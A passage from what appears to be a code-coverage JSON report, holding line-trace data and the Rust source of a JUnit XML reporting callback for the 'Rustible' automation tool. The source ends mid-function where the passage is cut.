}\n}\n","traces":[{"line":248,"address":[28373195,28372784,28373189],"length":1,"stats":{"Line":1}},{"line":250,"address":[28372822],"length":1,"stats":{"Line":1}},{"line":251,"address":[28372829],"length":1,"stats":{"Line":1}},{"line":252,"address":[28372836,28372891],"length":1,"stats":{"Line":2}},{"line":257,"address":[28372913],"length":1,"stats":{"Line":1}},{"line":258,"address":[28372920],"length":1,"stats":{"Line":1}},{"line":259,"address":[28372982],"length":1,"stats":{"Line":1}},{"line":281,"address":[28389808],"length":1,"stats":{"Line":1}},{"line":282,"address":[28389818],"length":1,"stats":{"Line":1}},{"line":347,"address":[28384672],"length":1,"stats":{"Line":0}},{"line":348,"address":[28384690],"length":1,"stats":{"Line":0}},{"line":349,"address":[28384717],"length":1,"stats":{"Line":0}},{"line":350,"address":[28384758],"length":1,"stats":{"Line":0}},{"line":351,"address":[28384794],"length":1,"stats":{"Line":0}},{"line":352,"address":[28384830],"length":1,"stats":{"Line":0}},{"line":362,"address":[28387399,28387405,28386432],"length":1,"stats":{"Line":1}},{"line":364,"address":[28386449],"length":1,"stats":{"Line":1}},{"line":367,"address":[28386544,28386588],"length":1,"stats":{"Line":2}},{"line":368,"address":[28386726,28386651],"length":1,"stats":{"Line":2}},{"line":369,"address":[28386751,28386823],"length":1,"stats":{"Line":2}},{"line":370,"address":[28386856,28386900],"length":1,"stats":{"Line":2}},{"line":371,"address":[28386973,28387059],"length":1,"stats":{"Line":2}},{"line":372,"address":[28387180,28387094],"length":1,"stats":{"Line":2}},{"line":373,"address":[28387205,28387274],"length":1,"stats":{"Line":2}},{"line":378,"address":[28387424],"length":1,"stats":{"Line":1}},{"line":379,"address":[28387432],"length":1,"stats":{"Line":1}},{"line":383,"address":[23387732,23387136,23387388,23387161,23387225,23387264],"length":1,"stats":{"Line":4}},{"line":384,"address":[23387209,23387252,23387419,23387682,23387316],"length":1,"stats":{"Line":3}},{"line":388,"address":[28386288,28386301],"length":1,"stats":{"Line":4}},{"line":389,"address":[23386066],"length":1,"stats":{"Line":1}},{"line":390,"address":[23386242,23386142],"length":1,"stats":{"Line":0}},{"line":392,"address":[23386121,23386200],"length":1,"stats":{"Line":2}},{"line":395,"address":[23386207,23386244],"length":1,"stats":{"Line":1}},{"line":396,"address":[25977607],"length":1,"stats":{"Line":2}},{"line":398,"address":[23386697,23386751],"length":1,"stats":{"Line":2}},{"line":399,"address":[23386894],"length":1,"stats":{"Line":1}},{"line":404,"address":[28386407,28386384],"length":1,"stats":{"Line":4}},{"line":405,"address":[23388621,23388747,23388850,23388668],"length":1,"stats":{"Line":2}},{"line":406,"address":[23389109,23389047],"length":1,"stats":{"Line":2}},{"line":408,"address":[23389202,23389602],"length":1,"stats":{"Line":2}},{"line":409,"address":[23389234,23389599,23389604],"length":1,"stats":{"Line":2}},{"line":410,"address":[23389217],"length":1,"stats":{"Line":1}},{"line":411,"address":[23389264,23389343,23389320],"length":1,"stats":{"Line":2}},{"line":412,"address":[26003054],"length":1,"stats":{"Line":2}},{"line":413,"address":[23389844,23389899],"length":1,"stats":{"Line":2}},{"line":414,"address":[23389567,23389863,23389910,23389513,23389287],"length":1,"stats":{"Line":4}},{"line":415,"address":[23389569,23389564,23389484],"length":1,"stats":{"Line":2}},{"line":417,"address":[23389511,23389462,23389515],"length":1,"stats":{"Line":2}},{"line":422,"address":[28386336,28386354],"length":1,"stats":{"Line":4}},{"line":423,"address":[23387836,23387879,23387946,23388055],"length":1,"stats":{"Line":2}},{"line":424,"address":[23388280],"length":1,"stats":{"Line":1}},{"line":425,"address":[23388339],"length":1,"stats":{"Line":1}},{"line":426,"address":[23388480,23388364,23388489],"length":1,"stats":{"Line":1}},{"line":432,"address":[28394992],"length":1,"stats":{"Line":1}},{"line":433,"address":[28395000],"length":1,"stats":{"Line":1}},{"line":438,"address":[28385523,28384880,28385517],"length":1,"stats":{"Line":1}},{"line":440,"address":[28384918],"length":1,"stats":{"Line":1}},{"line":441,"address":[28384940],"length":1,"stats":{"Line":1}},{"line":442,"address":[28384933],"length":1,"stats":{"Line":1}},{"line":443,"address":[28385010,28384947],"length":1,"stats":{"Line":2}},{"line":444,"address":[28385015,28385075],"length":1,"stats":{"Line":2}},{"line":445,"address":[28385140,28385080],"length":1,"stats":{"Line":2}},{"line":446,"address":[28385205,28385145],"length":1,"stats":{"Line":2}},{"line":447,"address":[28385210,28385270],"length":1,"stats":{"Line":2}},{"line":448,"address":[28385278,28385341],"length":1,"stats":{"Line":2}},{"line":449,"address":[28385349],"length":1,"stats":{"Line":1}},{"line":456,"address":[23382553,23381679,23381872,23381766,23381809,23381648,23381830,23381851,23381901,23382043,23384524],"length":1,"stats":{"Line":4}},{"line":459,"address":[26120257],"length":1,"stats":{"Line":2}},{"line":460,"address":[23382295,23382381],"length":1,"stats":{"Line":2}},{"line":465,"address":[23382436,23382567,23381817],"length":1,"stats":{"Line":1}},{"line":466,"address":[23382817,23382974,23382790,23383225,23382912],"length":1,"stats":{"Line":1}},{"line":471,"address":[26120289],"length":1,"stats":{"Line":1}},{"line":472,"address":[23383560,23383503],"length":1,"stats":{"Line":2}},{"line":477,"address":[26120305],"length":1,"stats":{"Line":1}},{"line":478,"address":[23383995,23383938],"length":1,"stats":{"Line":2}},{"line":483,"address":[23384021],"length":1,"stats":{"Line":1}},{"line":484,"address":[23384048],"length":1,"stats":{"Line":1}},{"line":486,"address":[26120321],"length":1,"stats":{"Line":2}},{"line":489,"address":[28372394],"length":1,"stats":{"Line":0}},{"line":491,"address":[23375175,23375119,23375293,23375414],"length":1,"stats":{"Line":0}},{"line":492,"address":[23375658,23375795,23375756,23375715],"length":1,"stats":{"Line":0}},{"line":493,"address":[23375721,23377116,23377104],"length":1,"stats":{"Line":0}},{"line":497,"address":[26114449],"length":1,"stats":{"Line":0}},{"line":500,"address":[23376378],"length":1,"stats":{"Line":0}},{"line":504,"address":[23376480],"length":1,"stats":{"Line":0}},{"line":506,"address":[23375217,23376777,23376868,23376695],"length":1,"stats":{"Line":0}},{"line":509,"address":[28372175],"length":1,"stats":{"Line":4}},{"line":512,"address":[26111729],"length":1,"stats":{"Line":2}},{"line":513,"address":[23371588,23371490],"length":1,"stats":{"Line":2}},{"line":518,"address":[23371033,23371774,23371643],"length":1,"stats":{"Line":1}},{"line":519,"address":[23372024,23372119,23372432,23372181,23371997],"length":1,"stats":{"Line":1}},{"line":524,"address":[23371054,23372315,23372487],"length":1,"stats":{"Line":1}},{"line":525,"address":[23372710,23372789],"length":1,"stats":{"Line":2}},{"line":526,"address":[23373363,23372902],"length":1,"stats":{"Line":2}},{"line":531,"address":[23372940],"length":1,"stats":{"Line":1}},{"line":532,"address":[23372975],"length":1,"stats":{"Line":1}},{"line":533,"address":[23373042],"length":1,"stats":{"Line":1}},{"line":535,"address":[23371075,23373438,23373297,23373215],"length":1,"stats":{"Line":2}},{"line":538,"address":[28372074],"length":1,"stats":{"Line":0}},{"line":540,"address":[26106305],"length":1,"stats":{"Line":0}},{"line":541,"address":[23370249,23370134,23370191],"length":1,"stats":{"Line":0}},{"line":542,"address":[23370828,23370197,23370816],"length":1,"stats":{"Line":0}},{"line":547,"address":[23370277],"length":1,"stats":{"Line":0}},{"line":550,"address":[23370315],"length":1,"stats":{"Line":0}},{"line":552,"address":[26106321],"length":1,"stats":{"Line":0}},{"line":555,"address":[23374992,23373923,23374801,23373673,23373745,23373648,23373799,23373779],"length":1,"stats":{"Line":0}},{"line":558,"address":[26112017],"length":1,"stats":{"Line":0}},{"line":559,"address":[23374807,23374153,23374294,23374234,23374207],"length":1,"stats":{"Line":0}},{"line":563,"address":[23374394],"length":1,"stats":{"Line":0}},{"line":564,"address":[23374426],"length":1,"stats":{"Line":0}},{"line":565,"address":[23374497],"length":1,"stats":{"Line":0}},{"line":567,"address":[26112033],"length":1,"stats":{"Line":0}},{"line":570,"address":[23380570,23377275,23377318,23377517,23377368,23377893,23377339,23377183,23377152],"length":1,"stats":{"Line":4}},{"line":571,"address":[23377240,23377305,23377551,23377433],"length":1,"stats":{"Line":2}},{"line":574,"address":[23377741,23377907,23377326],"length":1,"stats":{"Line":1}},{"line":577,"address":[23378130,23378064],"length":1,"stats":{"Line":2}},{"line":579,"address":[23380233,23378134],"length":1,"stats":{"Line":2}},{"line":581,"address":[23378178],"length":1,"stats":{"Line":1}},{"line":582,"address":[23379744],"length":1,"stats":{"Line":1}},{"line":583,"address":[23379942,23379883,23379819],"length":1,"stats":{"Line":2}},{"line":588,"address":[23379992],"length":1,"stats":{"Line":1}},{"line":590,"address":[23378155],"length":1,"stats":{"Line":1}},{"line":592,"address":[23378216],"length":1,"stats":{"Line":1}},{"line":593,"address":[23378326],"length":1,"stats":{"Line":1}},{"line":596,"address":[23378483],"length":1,"stats":{"Line":1}},{"line":598,"address":[23378251,23379709,23379270],"length":1,"stats":{"Line":3}},{"line":600,"address":[23378828],"length":1,"stats":{"Line":1}},{"line":601,"address":[23379305],"length":1,"stats":{"Line":1}},{"line":604,"address":[23379465],"length":1,"stats":{"Line":1}},{"line":608,"address":[23378793],"length":1,"stats":{"Line":1}},{"line":609,"address":[23378866],"length":1,"stats":{"Line":1}},{"line":612,"address":[23379026],"length":1,"stats":{"Line":1}},{"line":616,"address":[26117105],"length":1,"stats":{"Line":2}},{"line":619,"address":[23384665,23385186,23384585,23384985,23384707,23384560],"length":1,"stats":{"Line":0}},{"line":621,"address":[23384641],"length":1,"stats":{"Line":0}},{"line":622,"address":[23384749],"length":1,"stats":{"Line":0}},{"line":624,"address":[23384927,23384692,23384866,23385022],"length":1,"stats":{"Line":0}},{"line":627,"address":[23380665,23380740,23380640,23380870,23381389,23381593],"length":1,"stats":{"Line":0}},{"line":629,"address":[23380794,23380941,23380732],"length":1,"stats":{"Line":0}},{"line":630,"address":[23380922,23380801],"length":1,"stats":{"Line":0}},{"line":632,"address":[23380782],"length":1,"stats":{"Line":0}},{"line":636,"address":[23380825],"length":1,"stats":{"Line":0}},{"line":637,"address":[23381055,23380990],"length":1,"stats":{"Line":0}},{"line":639,"address":[23381105],"length":1,"stats":{"Line":0}},{"line":641,"address":[23381328,23380767,23381426,23381268],"length":1,"stats":{"Line":0}},{"line":676,"address":[28387840],"length":1,"stats":{"Line":1}},{"line":687,"address":[28389696],"length":1,"stats":{"Line":1}},{"line":688,"address":[28389710],"length":1,"stats":{"Line":1}},{"line":689,"address":[28389716],"length":1,"stats":{"Line":1}},{"line":697,"address":[28389760],"length":1,"stats":{"Line":1}},{"line":698,"address":[28389769],"length":1,"stats":{"Line":1}},{"line":699,"address":[28389772],"length":1,"stats":{"Line":1}},{"line":703,"address":[28387648,28387818],"length":1,"stats":{"Line":0}},{"line":704,"address":[28387757,28387685],"length":1,"stats":{"Line":0}},{"line":705,"address":[28387783],"length":1,"stats":{"Line":0}},{"line":709,"address":[28387626,28387456],"length":1,"stats":{"Line":0}},{"line":710,"address":[28387493,28387565],"length":1,"stats":{"Line":0}},{"line":711,"address":[28387591],"length":1,"stats":{"Line":0}},{"line":717,"address":[],"length":0,"stats":{"Line":0}},{"line":718,"address":[],"length":0,"stats":{"Line":0}},{"line":719,"address":[],"length":0,"stats":{"Line":0}},{"line":723,"address":[28387904,28389665],"length":1,"stats":{"Line":1}},{"line":724,"address":[28387926,28388159],"length":1,"stats":{"Line":2}},{"line":725,"address":[28387986],"length":1,"stats":{"Line":1}},{"line":726,"address":[28388046],"length":1,"stats":{"Line":0}},{"line":727,"address":[28388110],"length":1,"stats":{"Line":0}},{"line":728,"address":[28388149,28388318,28388484],"length":1,"stats":{"Line":0}},{"line":729,"address":[28388403],"length":1,"stats":{"Line":0}},{"line":730,"address":[28388333],"length":1,"stats":{"Line":0}},{"line":731,"address":[28388357,28388579],"length":1,"stats":{"Line":0}},{"line":732,"address":[28388691],"length":1,"stats":{"Line":0}},{"line":739,"address":[28388191],"length":1,"stats":{"Line":1}},{"line":740,"address":[28388242],"length":1,"stats":{"Line":1}},{"line":741,"address":[28388249],"length":1,"stats":{"Line":1}},{"line":742,"address":[28388264,28388837],"length":1,"stats":{"Line":2}},{"line":743,"address":[28388975,28388900],"length":1,"stats":{"Line":2}},{"line":744,"address":[28389072,28389000],"length":1,"stats":{"Line":2}},{"line":745,"address":[28389149,28389105],"length":1,"stats":{"Line":2}},{"line":746,"address":[28389222,28389308],"length":1,"stats":{"Line":2}},{"line":747,"address":[28389343,28389429],"length":1,"stats":{"Line":2}},{"line":748,"address":[28389454,28389523],"length":1,"stats":{"Line":2}},{"line":754,"address":[28395024],"length":1,"stats":{"Line":0}},{"line":755,"address":[28395032],"length":1,"stats":{"Line":0}}],"covered":124,"coverable":183},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","junit.rs"],"content":"//! JUnit XML callback plugin for Rustible.\n//!\n//! This plugin outputs test results in JUnit XML format for CI/CD integration.\n//! Compatible with Jenkins, GitLab CI, GitHub Actions, and other CI systems\n//! that support JUnit XML test reports.\n//!\n//! # JUnit XML Mapping\n//!\n//! - **Playbook** -\u003e `\u003ctestsuites\u003e` (root element)\n//! - **Play** -\u003e `\u003ctestsuite\u003e` (one per play)\n//! - **Task** -\u003e `\u003ctestcase\u003e` (one per task per host)\n//!\n//! # Features\n//!\n//! - Generates valid JUnit XML schema output\n//! - Captures task failures with detailed error messages\n//! - Includes timing information for each task\n//! - Groups test cases by play (testsuite)\n//! - Supports configurable output file path\n//!\n//! # Example Output\n//!\n//! ```xml\n//! \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n//! \u003ctestsuites name=\"webservers.yml\" tests=\"10\" failures=\"1\" errors=\"0\" skipped=\"2\" time=\"15.234\"\u003e\n//!   \u003ctestsuite name=\"Configure webservers\" tests=\"5\" failures=\"1\" errors=\"0\" skipped=\"1\" time=\"8.123\"\u003e\n//!     \u003ctestcase name=\"Install nginx\" classname=\"webserver1\" time=\"2.345\"\u003e\n//!     \u003c/testcase\u003e\n//!     \u003ctestcase name=\"Configure nginx\" classname=\"webserver1\" time=\"1.234\"\u003e\n//!       \u003cfailure message=\"File not found: /etc/nginx/nginx.conf\"\u003e\n//!         Task failed with error: File not found: /etc/nginx/nginx.conf\n//!       \u003c/failure\u003e\n//!     \u003c/testcase\u003e\n//!     \u003ctestcase name=\"Start nginx\" classname=\"webserver1\" time=\"0.567\"\u003e\n//!       \u003cskipped message=\"Skipped: when condition was false\"/\u003e\n//!     \u003c/testcase\u003e\n//!   \u003c/testsuite\u003e\n//! \u003c/testsuites\u003e\n//! ```\n//!\n//! # Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::JUnitCallback;\n//!\n//! let callback = JUnitCallback::new(\"test-results.xml\");\n//! executor.with_callback(Box::new(callback));\n//!\n//! // After playbook execution, the XML file is written automatically\n//! ```\n\nuse std::collections::HashMap;\nuse std::path::{Path, PathBuf};\nuse std::sync::Arc;\nuse std::time::Instant;\n\nuse async_trait::async_trait;\nuse tokio::sync::RwLock;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n/// Represents a single test case in JUnit XML format.\n#[derive(Debug, Clone)]\nstruct TestCase {\n    /// Name of the test case (task name)\n    name: String,\n    /// Class name (host name)\n    classname: String,\n    /// Execution time in seconds\n    time: f64,\n    /// Test outcome\n    outcome: TestOutcome,\n}\n\n/// Possible outcomes for a test case.\n#[derive(Debug, Clone)]\nenum TestOutcome {\n    /// Test passed successfully\n    Passed,\n    /// Test was skipped\n    Skipped { message: String },\n    /// Test failed\n    Failure { message: String, details: String },\n    /// Test encountered an error (unreachable host, etc.)\n    Error { message: String, details: String },\n}\n\n/// Represents a test suite (play) in JUnit XML format.\n#[derive(Debug, Clone)]\nstruct TestSuite {\n    /// Name of the test suite (play name)\n    name: String,\n    /// Test cases within this suite\n    test_cases: Vec\u003cTestCase\u003e,\n    /// Suite start time\n    start_time: Option\u003cInstant\u003e,\n    /// Total execution time in seconds\n    time: f64,\n}\n\nimpl TestSuite {\n    fn new(name: String) -\u003e Self {\n        Self {\n            name,\n            test_cases: Vec::new(),\n            start_time: Some(Instant::now()),\n            time: 0.0,\n        }\n    }\n\n    /// Calculates summary statistics for this test suite.\n    fn stats(\u0026self) -\u003e SuiteStats {\n        let mut stats = SuiteStats::default();\n        stats.tests = self.test_cases.len();\n\n        for tc in \u0026self.test_cases {\n            match \u0026tc.outcome {\n                TestOutcome::Passed =\u003e stats.passed += 1,\n                TestOutcome::Skipped { .. } =\u003e stats.skipped += 1,\n                TestOutcome::Failure { .. } =\u003e stats.failures += 1,\n                TestOutcome::Error { .. } =\u003e stats.errors += 1,\n            }\n            stats.time += tc.time;\n        }\n\n        stats\n    }\n\n    /// Finalizes the suite by calculating total time.\n    fn finalize(\u0026mut self) {\n        if let Some(start) = self.start_time.take() {\n            self.time = start.elapsed().as_secs_f64();\n        }\n    }\n}\n\n/// Summary statistics for a test suite.\n#[derive(Debug, Clone, Default)]\nstruct SuiteStats {\n    tests: usize,\n    passed: usize,\n    failures: usize,\n    errors: usize,\n    skipped: usize,\n    time: f64,\n}\n\n/// JUnit XML callback plugin for CI/CD integration.\n///\n/// This callback collects execution results and generates a JUnit XML\n/// report file that can be consumed by CI systems like Jenkins, GitLab CI,\n/// GitHub Actions, CircleCI, and others.\n///\n/// # Thread Safety\n///\n/// This callback is thread-safe and can be used with parallel task execution.\n/// All internal state is protected by async RwLocks.\n///\n/// # Example\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::JUnitCallback;\n///\n/// let callback = JUnitCallback::new(\"test-results/playbook.xml\");\n/// executor.with_callback(Box::new(callback));\n/// ```\n#[derive(Debug)]\npub struct JUnitCallback {\n    /// Path to write the XML output file\n    output_path: PathBuf,\n    /// Test suites (one per play)\n    test_suites: Arc\u003cRwLock\u003cVec\u003cTestSuite\u003e\u003e\u003e,\n    /// Current playbook name\n    playbook_name: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// Playbook start time\n    playbook_start: Arc\u003cRwLock\u003cOption\u003cInstant\u003e\u003e\u003e,\n    /// Whether playbook completed successfully\n    playbook_success: Arc\u003cRwLock\u003cbool\u003e\u003e,\n    /// Current play name for tracking\n    current_play: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// Task start times for duration tracking\n    task_starts: Arc\u003cRwLock\u003cHashMap\u003c(String, String), Instant\u003e\u003e\u003e,\n}\n\nimpl JUnitCallback {\n    /// Creates a new JUnit callback that writes to the specified output path.\n    ///\n    /// # Arguments\n    ///\n    /// * `output_path` - Path where the JUnit XML file will be written\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let callback = JUnitCallback::new(\"test-results/playbook.xml\");\n    /// ```\n    #[must_use]\n    pub fn new(output_path: impl AsRef\u003cPath\u003e) -\u003e Self {\n        Self {\n            output_path: output_path.as_ref().to_path_buf(),\n            test_suites: Arc::new(RwLock::new(Vec::new())),\n            playbook_name: Arc::new(RwLock::new(None)),\n            playbook_start: Arc::new(RwLock::new(None)),\n            playbook_success: Arc::new(RwLock::new(true)),\n            current_play: Arc::new(RwLock::new(None)),\n            task_starts: Arc::new(RwLock::new(HashMap::new())),\n        }\n    }\n\n    /// Creates a new JUnit callback with a default output path.\n    ///\n    /// The output file will be named `junit.xml` in the current directory.\n    #[must_use]\n    pub fn with_default_path() -\u003e Self {\n        Self::new(\"junit.xml\")\n    }\n\n    /// Returns the output path for the XML file.\n    pub fn output_path(\u0026self) -\u003e \u0026Path {\n        \u0026self.output_path\n    }\n\n    /// Returns whether any failures occurred during execution.\n    pub async fn has_failures(\u0026self) -\u003e bool {\n        !*self.playbook_success.read().await\n    }\n\n    /// Finalizes the callback and writes the JUnit XML file.\n    ///\n    /// This is called automatically at playbook end, but can be called\n    /// manually if needed.\n    ///\n    /// # Errors\n    ///\n    /// Returns an error if the file cannot be written.\n    pub async fn finalize(\u0026self) -\u003e std::io::Result\u003c()\u003e {\n        let xml = self.generate_xml().await;\n\n        // Create parent directories if they don't exist\n        if let Some(parent) = self.output_path.parent() {\n            if !parent.as_os_str().is_empty() {\n                tokio::fs::create_dir_all(parent).await?;\n            }\n        }\n\n        tokio::fs::write(\u0026self.output_path, xml).await\n    }\n\n    /// Generates the complete JUnit XML document.\n    async fn generate_xml(\u0026self) -\u003e String {\n        let suites = self.test_suites.read().await;\n        let playbook_name = self.playbook_name.read().await;\n        let playbook_start = self.playbook_start.read().await;\n\n        let name = playbook_name.as_deref().unwrap_or(\"Rustible Playbook\");\n        let total_time = playbook_start\n            .as_ref()\n            .map(|s| s.elapsed().as_secs_f64())\n            .unwrap_or(0.0);\n\n        // Calculate totals across all suites\n        let mut total_tests = 0;\n        let mut total_failures = 0;\n        let mut total_errors = 0;\n        let mut total_skipped = 0;\n\n        for suite in suites.iter() {\n            let stats = suite.stats();\n            total_tests += stats.tests;\n            total_failures += stats.failures;\n            total_errors += stats.errors;\n            total_skipped += stats.skipped;\n        }\n\n        let mut xml = String::new();\n        xml.push_str(\"\u003c?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?\u003e\\n\");\n        xml.push_str(\u0026format!(\n            \"\u003ctestsuites name=\\\"{}\\\" tests=\\\"{}\\\" failures=\\\"{}\\\" errors=\\\"{}\\\" skipped=\\\"{}\\\" time=\\\"{:.3}\\\"\u003e\\n\",\n            escape_xml(name),\n            total_tests,\n            total_failures,\n            total_errors,\n            total_skipped,\n            total_time\n        ));\n\n        for suite in suites.iter() {\n            xml.push_str(\u0026self.generate_testsuite_xml(suite));\n        }\n\n        xml.push_str(\"\u003c/testsuites\u003e\\n\");\n        xml\n    }\n\n    /// Generates XML for a single test suite.\n    fn generate_testsuite_xml(\u0026self, suite: \u0026TestSuite) -\u003e String {\n        let stats = suite.stats();\n        let mut xml = String::new();\n\n        xml.push_str(\u0026format!(\n            \"  \u003ctestsuite name=\\\"{}\\\" tests=\\\"{}\\\" failures=\\\"{}\\\" errors=\\\"{}\\\" skipped=\\\"{}\\\" time=\\\"{:.3}\\\"\u003e\\n\",\n            escape_xml(\u0026suite.name),\n            stats.tests,\n            stats.failures,\n            stats.errors,\n            stats.skipped,\n            suite.time\n        ));\n\n        for tc in \u0026suite.test_cases {\n            xml.push_str(\u0026self.generate_testcase_xml(tc));\n        }\n\n        xml.push_str(\"  \u003c/testsuite\u003e\\n\");\n        xml\n    }\n\n    /// Generates XML for a single test case.\n    fn generate_testcase_xml(\u0026self, tc: \u0026TestCase) -\u003e String {\n        let mut xml = String::new();\n\n        xml.push_str(\u0026format!(\n            \"    \u003ctestcase name=\\\"{}\\\" classname=\\\"{}\\\" time=\\\"{:.3}\\\"\",\n            escape_xml(\u0026tc.name),\n            escape_xml(\u0026tc.classname),\n            tc.time\n        ));\n\n        match \u0026tc.outcome {\n            TestOutcome::Passed =\u003e {\n                xml.push_str(\"/\u003e\\n\");\n            }\n            TestOutcome::Skipped { message } =\u003e {\n                xml.push_str(\"\u003e\\n\");\n                xml.push_str(\u0026format!(\n                    \"      \u003cskipped message=\\\"{}\\\"/\u003e\\n\",\n                    escape_xml(message)\n                ));\n                xml.push_str(\"    \u003c/testcase\u003e\\n\");\n            }\n            TestOutcome::Failure { message, details } =\u003e {\n                xml.push_str(\"\u003e\\n\");\n                xml.push_str(\u0026format!(\n                    \"      \u003cfailure message=\\\"{}\\\"\u003e\\n\",\n                    escape_xml(message)\n                ));\n                xml.push_str(\u0026format!(\"{}\\n\", escape_xml_content(details)));\n                xml.push_str(\"      \u003c/failure\u003e\\n\");\n                xml.push_str(\"    \u003c/testcase\u003e\\n\");\n            }\n            TestOutcome::Error { message, details } =\u003e {\n                xml.push_str(\"\u003e\\n\");\n                xml.push_str(\u0026format!(\n                    \"      \u003cerror message=\\\"{}\\\"\u003e\\n\",\n                    escape_xml(message)\n                ));\n                xml.push_str(\u0026format!(\"{}\\n\", escape_xml_content(details)));\n                xml.push_str(\"      \u003c/error\u003e\\n\");\n                xml.push_str(\"    \u003c/testcase\u003e\\n\");\n            }\n        }\n\n        xml\n    }\n\n    /// Gets or creates the current test suite for the active play.\n    async fn get_or_create_suite(\u0026self, play_name: \u0026str) -\u003e usize {\n        let mut suites = self.test_suites.write().await;\n\n        // Find existing suite or create new one\n        if let Some(pos) = suites.iter().position(|s| s.name == play_name) {\n            pos\n        } else {\n            let suite = TestSuite::new(play_name.to_string());\n            suites.push(suite);\n            suites.len() - 1\n        }\n    }\n}\n\nimpl Default for JUnitCallback {\n    fn default() -\u003e Self {\n        Self::with_default_path()\n    }\n}\n\nimpl Clone for JUnitCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            output_path: self.output_path.clone(),\n            test_suites: Arc::clone(\u0026self.test_suites),\n            playbook_name: Arc::clone(\u0026self.playbook_name),\n            playbook_start: Arc::clone(\u0026self.playbook_start),\n            playbook_success: Arc::clone(\u0026self.playbook_success),\n            current_play: Arc::clone(\u0026self.current_play),\n            task_starts: Arc::clone(\u0026self.task_starts),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for JUnitCallback {\n    /// Called when a playbook starts - initializes tracking state.\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        let mut playbook_name = self.playbook_name.write().await;\n        *playbook_name = Some(name.to_string());\n\n        let mut playbook_start = self.playbook_start.write().await;\n        *playbook_start = Some(Instant::now());\n\n        let mut playbook_success = self.playbook_success.write().await;\n        *playbook_success = true;\n\n        // Clear any previous state\n        let mut suites = self.test_suites.write().await;\n        suites.clear();\n\n        let mut task_starts = self.task_starts.write().await;\n        task_starts.clear();\n    }\n\n    /// Called when a playbook ends - finalizes all suites and writes XML.\n    async fn on_playbook_end(\u0026self, _name: \u0026str, success: bool) {\n        let mut playbook_success = self.playbook_success.write().await;\n        *playbook_success = success;\n        drop(playbook_success);\n\n        // Finalize all test suites\n        let mut suites = self.test_suites.write().await;\n        for suite in suites.iter_mut() {\n            suite.finalize();\n        }\n        drop(suites);\n\n        // Write the XML file\n        if let Err(e) = self.finalize().await {\n            eprintln!(\n                \"Failed to write JUnit XML report to {:?}: {}\",\n                self.output_path, e\n            );\n        }\n    }\n\n    /// Called when a play starts - creates a new test suite.\n    async fn on_play_start(\u0026self, name: \u0026str, _hosts: \u0026[String]) {\n        let mut current_play = self.current_play.write().await;\n        *current_play = Some(name.to_string());\n\n        // Create the test suite for this play\n        self.get_or_create_suite(name).await;\n    }\n\n    /// Called when a play ends - finalizes the test suite.\n    async fn on_play_end(\u0026self, name: \u0026str, _success: bool) {\n        let mut suites = self.test_suites.write().await;\n        if let Some(suite) = suites.iter_mut().find(|s| s.name == name) {\n            suite.finalize();\n        }\n    }\n\n    /// Called when a task starts - records start time.\n    async fn on_task_start(\u0026self, name: \u0026str, host: \u0026str) {\n        let mut task_starts = self.task_starts.write().await;\n        task_starts.insert((host.to_string(), name.to_string()), Instant::now());\n    }\n\n    /// Called when a task completes - records result as test case.\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let current_play = self.current_play.read().await;\n        let play_name = current_play\n            .as_deref()\n            .unwrap_or(\"Unknown Play\")\n            .to_string();\n        drop(current_play);\n\n        // Get task duration from task_starts or use result.duration\n        let task_starts = self.task_starts.read().await;\n        let duration = task_starts\n            .get(\u0026(result.host.clone(), result.task_name.clone()))\n            .map(|start| start.elapsed())\n            .unwrap_or(result.duration);\n        drop(task_starts);\n\n        // Determine test outcome based on result\n        let outcome = if result.result.skipped {\n            TestOutcome::Skipped {\n                message: result.result.message.clone(),\n            }\n        } else if !result.result.success {\n            TestOutcome::Failure {\n                message: truncate_message(\u0026result.result.message, 200),\n                details: format!(\n                    \"Task failed on host '{}'\\nTask: {}\\nError: {}\",\n                    result.host, result.task_name, result.result.message\n                ),\n            }\n        } else {\n            TestOutcome::Passed\n        };\n\n        // Create test case\n        let test_case = TestCase {\n            name: result.task_name.clone(),\n            classname: result.host.clone(),\n            time: duration.as_secs_f64(),\n            outcome,\n        };\n\n        // Add to appropriate test suite\n        let suite_idx = self.get_or_create_suite(\u0026play_name).await;\n        let mut suites = self.test_suites.write().await;\n        if let Some(suite) = suites.get_mut(suite_idx) {\n            suite.test_cases.push(test_case);\n        }\n\n        // Mark failure if task failed\n        if !result.result.success \u0026\u0026 !result.result.skipped {\n            let mut playbook_success = self.playbook_success.write().await;\n            *playbook_success = false;\n        }\n    }\n\n    /// Called when a handler is triggered - not tracked in JUnit output.\n    async fn on_handler_triggered(\u0026self, _name: \u0026str) {\n        // Handlers are not tracked as separate test cases\n    }\n\n    /// Called when facts are gathered - not tracked in JUnit output.\n    async fn on_facts_gathered(\u0026self, _host: \u0026str, _facts: \u0026Facts) {\n        // Fact gathering is not tracked as a test case\n    }\n}\n\n/// Trait extension for handling unreachable hosts in JUnit format.\n#[async_trait]\npub trait UnreachableCallback: ExecutionCallback {\n    /// Called when a host becomes unreachable - records as error.\n    async fn on_host_unreachable(\u0026self, host: \u0026str, task_name: \u0026str, error: \u0026str);\n}\n\n#[async_trait]\nimpl UnreachableCallback for JUnitCallback {\n    async fn on_host_unreachable(\u0026self, host: \u0026str, task_name: \u0026str, error: \u0026str) {\n        let current_play = self.current_play.read().await;\n        let play_name = current_play\n            .as_deref()\n            .unwrap_or(\"Unknown Play\")\n            .to_string();\n        drop(current_play);\n\n        // Create error test case for unreachable host\n        let test_case = TestCase {\n            name: task_name.to_string(),\n            classname: host.to_string(),\n            time: 0.0,\n            outcome: TestOutcome::Error {\n                message: format!(\"Host unreachable: {}\", host),\n                details: format!(\n                    \"Failed to connect to host '{}'\\nTask: {}\\nError: {}\",\n                    host, task_name, error\n                ),\n            },\n        };\n\n        // Add to appropriate test suite\n        let suite_idx = self.get_or_create_suite(\u0026play_name).await;\n        let 